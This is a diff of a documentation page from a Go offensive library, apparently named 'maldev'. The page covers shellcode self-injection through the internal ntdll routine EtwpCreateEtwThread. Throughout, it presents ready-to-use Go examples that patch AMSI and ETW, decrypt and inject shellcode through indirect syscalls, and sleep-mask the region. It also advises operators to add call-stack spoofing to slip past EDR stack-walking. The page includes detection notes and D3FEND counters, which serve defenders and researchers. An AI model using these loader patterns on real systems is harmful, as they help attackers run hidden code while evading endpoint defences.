@@ -1,152 +1,221 @@
-# EtwpCreateEtwThread Injection
+---
+package: github.com/oioio-space/maldev/inject
+last_reviewed: 2026-04-27
+reflects_commit: 4798780
+---
 
-> **MITRE ATT&CK:** T1055 -- Process Injection | **Detection:** Low -- internal ntdll function, rarely monitored by EDR
+# EtwpCreateEtwThread injection
+
+[← injection index](README.md) · [docs/index](../../index.md)
+
+## TL;DR
+
+Self-injection via the **internal** `ntdll!EtwpCreateEtwThread` —
+ETW's private thread-creation routine. Allocates RX in the current
+process, writes shellcode, calls the routine with the shellcode
+address as the start point. Same end result as `NtCreateThreadEx`,
+but the underlying call is unexported and rarely hooked. Self-process
+only.
 
 ## Primer
 
-Imagine a building has a main entrance guarded by security. Everyone who walks through the front door is checked and logged. But deep inside the building, there is a service elevator used only by maintenance staff. Security never watches it because it was never meant for visitors.
+ETW (Event Tracing for Windows) maintains its own helper threads for
+trace-buffer management. Internally `ntdll` exposes the
+`EtwpCreateEtwThread` routine to spawn those helpers. The routine
+boils down to `NtCreateThreadEx` with ETW-specific flags and a small
+trampoline, but **it is not exported by name** — EDR products that
+hook `NtCreateThreadEx` for thread-creation telemetry typically do not
+also hook the private ETW routine.
 
-`EtwpCreateEtwThread` is that service elevator. It is an internal, undocumented function inside `ntdll.dll` that Windows uses internally for Event Tracing for Windows (ETW) operations. It creates a thread just like `CreateThread` or `NtCreateThreadEx`, but because it is an internal ETW mechanism, most EDR products do not hook or monitor it. By calling it directly with a pointer to our shellcode, we get a thread running our code with almost no security scrutiny.
+The implant resolves `EtwpCreateEtwThread` by symbol lookup or hashed
+PEB walk, allocates an RX page in itself, and calls the routine with
+the shellcode address as the start point. A real OS thread starts at
+the shellcode — same outcome as `CreateThread`, far quieter on
+userland-hook telemetry.
 
-This technique is **self-injection only** -- it runs shellcode in the current process, not in a remote target.
+This is **self-process only**. Cross-process work needs a different
+primitive.
 
-## How It Works
+## How it works
 
 ```mermaid
-sequenceDiagram
-    participant Attacker as Attacker Process
-    participant Kernel as Windows Kernel
-    participant Thread as New Thread
-
-    Attacker->>Kernel: VirtualAlloc(RW)
-    Kernel-->>Attacker: addr
-
-    Attacker->>Attacker: memcpy(addr, shellcode)
-
-    Attacker->>Kernel: VirtualProtect(addr, RX)
-    Kernel-->>Attacker: OK
-
-    Attacker->>Kernel: EtwpCreateEtwThread(addr, 0)
-    Kernel->>Thread: Thread created at addr
-    Thread->>Thread: Shellcode executes
+flowchart LR
+    A[VirtualAlloc RW] --> B[memcpy shellcode]
+    B --> C[VirtualProtect → RX]
+    C --> D[resolve ntdll!EtwpCreateEtwThread]
+    D --> E[invoke EtwpCreateEtwThread<br/>start = shellcode]
+    E --> F[new OS thread runs shellcode]
 ```
 
-**Step-by-step:**
+Steps:
 
-1. **VirtualAlloc(PAGE_READWRITE)** -- Allocate writable memory in the current process.
-2. **memcpy** -- Copy the shellcode into the allocated region.
-3. **VirtualProtect(PAGE_EXECUTE_READ)** -- Flip permissions to executable (avoids RWX pages that EDR flags).
-4. **EtwpCreateEtwThread(addr, 0)** -- Call the internal ntdll function. It creates a new thread starting at `addr`. The second parameter is a context pointer (unused, set to 0).
+1. **Allocate / write / protect** in the current process (RW → RX).
+2. **Resolve** `ntdll!EtwpCreateEtwThread` via `GetProcAddress`,
+   manual export-table walk, or a [hashed PEB walk](../syscalls/api-hashing.md).
+3. **Call** the routine with the shellcode address as the start
+   parameter.
 
-The function returns a thread HANDLE on success (non-zero), or 0 on failure. Note: unlike `NtCreateThreadEx`, the return value is a HANDLE, not an NTSTATUS.
-
-## Why This Is Stealthy
-
-| Aspect | CreateThread | NtCreateThreadEx | EtwpCreateEtwThread |
-|--------|-------------|-----------------|---------------------|
-| Hooked by EDR | Always | Usually | Rarely |
-| Documented API | Yes | Semi-documented | Internal/undocumented |
-| In import table | Common | Sometimes | Never |
-| Thread creation syscall | Same | Same | Same |
-
-The underlying syscall is the same (`NtCreateThreadEx`), but EDR hooks are placed on the *userland wrappers*, not the kernel. By calling an internal wrapper that EDR vendors don't instrument, we bypass those hooks.
-
-**Caveat:** Some advanced EDRs perform kernel-level ETW thread monitoring or syscall tracing, which would catch this. The technique is best combined with other evasion (AMSI/ETW patching, unhooking).
-
-## Usage
-
-```go
-package main
-
-import (
-    "log"
-
-    "github.com/oioio-space/maldev/inject"
-)
-
-func main() {
-    shellcode := []byte{0x90, 0x90, 0xCC}
-
-    injector, err := inject.Build().
-        Method(inject.MethodEtwpCreateEtwThread).
-        Create()
-    if err != nil {
-        log.Fatal(err)
-    }
-    if err := injector.Inject(shellcode); err != nil {
-        log.Fatal(err)
-    }
-}
-```
-
-## Combined Example
-
-```go
-package main
-
-import (
-    "log"
-
-    "github.com/oioio-space/maldev/evasion"
-    "github.com/oioio-space/maldev/evasion/preset"
-    "github.com/oioio-space/maldev/inject"
-)
-
-func main() {
-    shellcode := []byte{0x90, 0x90, 0xCC}
-
-    // 1. Patch AMSI + ETW before injection.
-    if errs := evasion.ApplyAll(preset.Minimal(), nil); errs != nil {
-        log.Printf("evasion errors: %v", errs)
-    }
-
-    // 2. Inject via EtwpCreateEtwThread with fallback.
-    injector, err := inject.Build().
-        Method(inject.MethodEtwpCreateEtwThread).
-        WithFallback().
-        Create()
-    if err != nil {
-        log.Fatal(err)
-    }
-    if err := injector.Inject(shellcode); err != nil {
-        log.Fatal(err)
-    }
-}
-```
-
-## Advantages & Limitations
-
-| Aspect | Detail |
-|--------|--------|
-| Stealth | High -- internal ntdll function, not hooked by most EDR products. |
-| Scope | Self-injection only (current process). Cannot inject into remote processes. |
-| Compatibility | Windows 7+ (EtwpCreateEtwThread has been present since Vista). |
-| Return value | Returns HANDLE (not NTSTATUS) -- non-zero = success, 0 = failure. |
-| Caller routing | Partial -- memory operations (VirtualAlloc/VirtualProtect) can route through Caller, but EtwpCreateEtwThread itself must use direct proc call because its return convention differs from NTSTATUS. |
-| Fallback | Falls back to CreateThread, then CreateFiber if EtwpCreateEtwThread fails. |
+The internal routine ends up calling `NtCreateThreadEx` itself; the
+kernel's thread-creation telemetry still fires (`PsSetCreateThreadNotifyRoutine`).
+What the technique evades is the **userland-hook** layer that EDR
+products typically install on the documented `CreateThread` family.
 
 ## API Reference
 
+This injection mode is selected via `Method`. The package does not
+expose `EtwpCreateEtwThread` as a top-level helper — drive it through
+the standard `Injector` / `Builder` paths.
+
+### `Method = MethodEtwpCreateEtwThread`
+
+[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/inject#MethodEtwpCreateEtwThread)
+
+The constant `"etwthr"`. Self-injection only — `Config.PID` must be
+`0` (current process) or unset.
+
+### `Builder` pattern
+
 ```go
-// Method constant
-const MethodEtwpCreateEtwThread Method = "etwthr"
-
-// Builder pattern
-injector, err := inject.Build().
-    Method(inject.MethodEtwpCreateEtwThread).
-    Create()
-
-// With syscall routing for memory operations
-injector, err := inject.Build().
+inj, err := inject.Build().
     Method(inject.MethodEtwpCreateEtwThread).
     IndirectSyscalls().
     Create()
-
-// Config pattern
-cfg := &inject.WindowsConfig{
-    Config: inject.Config{
-        Method: inject.MethodEtwpCreateEtwThread,
-    },
-}
-injector, err := inject.NewWindowsInjector(cfg)
 ```
+
+`SelfInjector` is implemented; the freshly-allocated region is
+recoverable via `InjectedRegion` for sleep masking or wiping.
+
+## Examples
+
+### Simple
+
+```go
+import "github.com/oioio-space/maldev/inject"
+
+cfg := inject.DefaultWindowsConfig(inject.MethodEtwpCreateEtwThread, 0)
+inj, err := inject.NewWindowsInjector(cfg)
+if err != nil { return err }
+return inj.Inject(shellcode)
+```
+
+### Composed (with SelfInjector for sleep masking)
+
+```go
+import (
+    "time"
+
+    "github.com/oioio-space/maldev/evasion/sleepmask"
+    "github.com/oioio-space/maldev/inject"
+)
+
+inj, err := inject.Build().
+    Method(inject.MethodEtwpCreateEtwThread).
+    IndirectSyscalls().
+    Create()
+if err != nil { return err }
+if err := inj.Inject(shellcode); err != nil { return err }
+
+if self, ok := inj.(inject.SelfInjector); ok {
+    if r, ok := self.InjectedRegion(); ok {
+        mask := sleepmask.New(sleepmask.Region{Addr: r.Addr, Size: r.Size})
+        for {
+            mask.Sleep(30 * time.Second)
+        }
+    }
+}
+```
+
+### Advanced (decrypt + ETWP inject + sleep mask)
+
+```go
+import (
+    "time"
+
+    "github.com/oioio-space/maldev/cleanup/memory"
+    "github.com/oioio-space/maldev/crypto"
+    "github.com/oioio-space/maldev/evasion"
+    "github.com/oioio-space/maldev/evasion/preset"
+    "github.com/oioio-space/maldev/evasion/sleepmask"
+    "github.com/oioio-space/maldev/inject"
+)
+
+_ = evasion.ApplyAll(preset.Stealth(), nil)
+
+shellcode, err := crypto.DecryptAESGCM(aesKey, encrypted)
+if err != nil { return err }
+memory.SecureZero(aesKey)
+
+inj, err := inject.Build().
+    Method(inject.MethodEtwpCreateEtwThread).
+    IndirectSyscalls().
+    Create()
+if err != nil { return err }
+if err := inj.Inject(shellcode); err != nil { return err }
+memory.SecureZero(shellcode)
+
+if self, ok := inj.(inject.SelfInjector); ok {
+    if r, ok := self.InjectedRegion(); ok {
+        mask := sleepmask.New(sleepmask.Region{Addr: r.Addr, Size: r.Size})
+        for {
+            mask.Sleep(60 * time.Second)
+        }
+    }
+}
+```
+
+### Complex
+
+The `Pipeline` API has no dedicated `EtwpCreateEtwThreadExecutor`;
+the named-method path is canonical. To experiment with custom
+executors, replicate the resolve-and-call snippet from
+[`inject/injector_self_windows.go`](../../../inject/injector_self_windows.go).
+
+## OPSEC & Detection
+
+| Artefact | Where defenders look |
+|---|---|
+| Userland hooks on `NtCreateThreadEx` / `CreateThread` | **Bypassed** — `EtwpCreateEtwThread` is unexported |
+| Kernel `PsSetCreateThreadNotifyRoutine` callback | Still fires — the kernel sees a normal thread creation |
+| Stack-walking on the new thread | The start address points into a non-image RX region — same orphan signal as `CreateRemoteThread` |
+| `EtwpCreateEtwThread` invocation from a non-ETW caller | Niche EDR rule — most products do not key on it; mature ETW-aware EDRs (CrowdStrike) do |
+
+**D3FEND counters:**
+
+- [D3-PSA](https://d3fend.mitre.org/technique/d3f:ProcessSpawnAnalysis/)
+  — kernel callback still surfaces the new thread.
+- [D3-PCSV](https://d3fend.mitre.org/technique/d3f:ProcessCodeSegmentVerification/)
+  — verifies the start address against image segments.
+
+**Hardening for the operator:** combine with [`evasion/callstack`](../evasion/callstack-spoof.md)
+to fake the call site so stack-walking telemetry does not trivially
+flag the orphan thread; pair with [`evasion/sleepmask`](../evasion/sleep-mask.md)
+to encrypt the RX region between activations.
+
+## MITRE ATT&CK
+
+| T-ID | Name | Sub-coverage | D3FEND counter |
+|---|---|---|---|
+| [T1055](https://attack.mitre.org/techniques/T1055/) | Process Injection | self-process variant via internal ntdll routine | D3-PSA |
+
+## Limitations
+
+- **Self-process only.** The routine starts a thread in the calling
+  process. No PID parameter.
+- **Not a kernel-callback bypass.** `PsSetCreateThreadNotifyRoutine`
+  still fires. The technique evades userland-hook telemetry only.
+- **Undocumented.** `EtwpCreateEtwThread` is internal to ntdll. Future
+  Windows builds may rename, relocate, or remove it. The package's
+  resolver caches the address; verify after major OS updates.
+- **Stack walks still expose orphan threads.** Pair with callstack
+  spoofing for thorough coverage.
+
+## See also
+
+- [CreateRemoteThread](create-remote-thread.md) — the documented
+  variant.
+- [NtQueueApcThreadEx](nt-queue-apc-thread-ex.md) — alternative
+  self-process path with no thread creation event at all.
+- [`evasion/callstack`](../evasion/callstack-spoof.md) — fake the
+  call site of the spawned thread.
+- [`evasion/sleepmask`](../evasion/sleep-mask.md) — encrypt the RX
+  region during inactive periods.
